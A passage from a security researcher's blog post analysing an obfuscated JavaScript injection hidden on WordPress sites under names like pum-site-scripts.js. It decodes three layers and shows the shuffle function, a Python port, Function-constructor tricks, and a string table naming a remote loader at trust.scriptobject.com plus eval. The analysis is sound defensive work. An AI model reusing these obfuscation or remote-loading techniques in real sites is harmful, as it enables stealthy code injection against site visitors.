---
title: Three Layers Deep - A Referrer-Gated Script Injection Hiding in Popup Maker's JavaScript
url: https://lukeleal.com/research/posts/httpclient-referrer-gated-js-injection/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:27.505821
---

# Three Layers Deep - A Referrer-Gated Script Injection Hiding in Popup Maker's JavaScript

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Three Layers Deep - A Referrer-Gated Script Injection Hiding in Popup Maker’s JavaScript](https://lukeleal.com/research/posts/httpclient-referrer-gated-js-injection/)

2026-08-22Luke

#[HttpClient](https://lukeleal.com/research/tags/httpclient/)
#[zqxw](https://lukeleal.com/research/tags/zqxw/)
#[scriptobject.com](https://lukeleal.com/research/tags/scriptobject.com/)
#[obfuscation](https://lukeleal.com/research/tags/obfuscation/)
#[referrer](https://lukeleal.com/research/tags/referrer/)
#[injection](https://lukeleal.com/research/tags/injection/)
#[Popup Maker](https://lukeleal.com/research/tags/popup-maker/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[JavaScript](https://lukeleal.com/research/tags/javascript/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Three Layers Deep - A Referrer-Gated Script Injection Hiding in Popup Maker's JavaScript](https://lukeleal.com/research/httpclient-injection-cover-q90.jpg "Cover Image")

## Table of Contents

* [The File Name](#the-file-name)
* [Layer 1: A Shuffle and a Hidden Function Constructor](#layer-1-a-shuffle-and-a-hidden-function-constructor)
* [Layer 2: A Word-Dictionary Unpacker](#layer-2-a-word-dictionary-unpacker)
* [Layer 3: Renamed Operators and a String Table](#layer-3-renamed-operators-and-a-string-table)
* [What the Code Does](#what-the-code-does)
  + [The gate](#the-gate)
  + [The marker](#the-marker)
* [The Domain](#the-domain)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

Two copies of the same script came in under names that blend in: **`pum-site-scripts.js`** and **`dashboard-widget.min.js`**. Each is about 4 KB of unreadable JavaScript. It took three decoding steps to reach the real code, and the real code is only about 25 lines.

> It only does anything for a visitor who **arrived from another website** and has **no cookies yet**. Anyone who types the address, uses a bookmark, or has been on the site before sees nothing.

That condition, a first visit from a search result or a link, is exactly what the site owner *never* matches when they check their own site. This is how the script can sit on a site for months.

## The File Name[#](#the-file-name)

`pum-site-scripts.js` isn’t a random name. [Popup Maker](https://wppopupmaker.com/docs/problem-solving/popup-maker-detected-an-issue-with-your-file-system/), a popular WordPress popup plugin, caches its popup settings in a generated file with that name in `/wp-content/uploads/pum/`. A file with that name is expected to be there, it’s JavaScript, and it’s loaded on pages. The other copy, `dashboard-widget.min.js`, looks like a core WordPress script name.

The two files are identical except for **three bytes**: the `pum-site-scripts.js` copy starts with two blank lines and a `;`. That leading semicolon is what you add when you’re pasting code in front of or after someone else’s file, so it can’t be confused with the previous statement. I don’t know how the script got onto the site. Here it’s just the payload.

## Layer 1: A Shuffle and a Hidden Function Constructor[#](#layer-1-a-shuffle-and-a-hidden-function-constructor)

The file opens with a function called `wCc`, plus a string that looks like noise:

```
function wCc(q){var b=504295;var e=q.length;var m=[];for(var k=0;k<e;k++){m[k]=q.charAt(k)};for(var k=0;k<e;k++){var f=b*(k+355)+(b%31595);var v=b*(k+546)+(b%45048);var i=f%e;var r=v%e;var g=m[i];m[i]=m[r];m[r]=g;b=(f+v)%1888360;};return m.join('')};
var FOV=wCc('nbnzqoytrrxodjotvcriukfgcwpeactlmushs').substr(0,KtB);
```

`wCc` is a fixed **shuffle**. It walks the string and swaps characters in a pattern driven by a counter that starts at 504295, so the result depends only on the string’s length. The author stores each string already scrambled, so that passing it through `wCc` produces the text they wanted. Here’s the same function in Python, which I used so that I never ran the file:

```
def wCc(q):
    b = 504295; e = len(q); m = list(q)
    for k in range(e):
        f = b*(k+355) + (b % 31595)
        v = b*(k+546) + (b % 45048)
        i, r = f % e, v % e
        m[i], m[r] = m[r], m[i]
        b = (f + v) % 1888360
    return ''.join(m)
```

`wCc('nbnzqoytrrxodjotvcriukfgcwpeactlmushs')` starts with **`constructor`**. The script then does `wCc['constructor']`. In JavaScript, a function’s `.constructor` is `Function`, so it has quietly gotten hold of **`Function`**, the way to turn a string into code, without ever writing `Function`, `eval`, or the word `constructor`. It then calls it twice:

```
var fNn = Zus('', wCc(zCs));       // Function('', <decoded text A>)
var JVG = fNn(wCc('ej;))7t=6_...'));   // run A on a second scrambled string
var trO = qGy('', JVG);            // Function('', <result>)
trO(3755);                         // run it
```

## Layer 2: A Word-Dictionary Unpacker[#](#layer-2-a-word-dictionary-unpacker)

Un-shuffling the first long string, `zCs`, gives an 890-character function. This is the second layer, and it’s a **text unpacker**:

```
var d=10,f=36,v=17;var u="abcdefghijklmnopqrstuvwxyz";var c=[90,60,88,79,89,86,76,75,72,66,87,71,82,65,85,80,94,70,81,74]; ...
```

It splits its input on spaces and, working from the end, replaces two-character **back-references** (one of 20 marker characters plus an offset) with an earlier word from the same list. It then swaps `.a` to `.z` sequences for characters that would otherwise need escaping (newline, quote, backslash, space, and the marker characters themselves). It’s a simple compression scheme, a bit like dictionary compression, and the effect is that the real script appears only after the unpacker has put it back together. I ported it to Python and ran it on the second scrambled string, getting 4,806 characters of text.

## Layer 3: Renamed Operators and a String Table[#](#layer-3-renamed-operators-and-a-string-table)

That text is still not readable. It’s JavaScript where:

* **Every operator is a function.** `a + b` is `jso$ft$boe$_43(a, b)`, `==` is `jso$ft$boe$_61_61`, `!` is `jso$ft$uoel$_33`, and `<` is `jso$ft$boe$_60`. The `_43`, `_61_61` and so on are the character codes of the operator.
* **Every global is a function.** `window` is `jso$ft$giden$window()`, which does `return window`.
* **Every string is in a table.** The strings sit in one scrambled blob that’s unscrambled with another seeded shuffle (seed `1752306`), then split into 23 entries, and the code only refers to `_$_d001[12]`, `_$_d001[20]` and so on.

The 23 strings, once decoded (I’ve put the table in the samples below), give everything away:

`get`, `onreadystatechange`, `readyState`, `status`, `responseText`, `GET`, `open`, `send`, `substr`, `toString`, `random`, `cookie`, `hostname`, `location`, `referrer`, `www.`, `indexOf`, `://`, `://www.`, **`https://trust.scriptobject.com/init.js?ver=`**, **`qwzx`**, `eval`

There’s also dead weight. The script checks whether its own functions exist (`if(!_$af2045846){...}`), and these tests are always false; they exist to make any rewrite that renames or removes a function less likely to work. It also ends with `return 9930` and is called as `trO(3755)`, both unused numbers.

## What the Code Does[#](#what-the...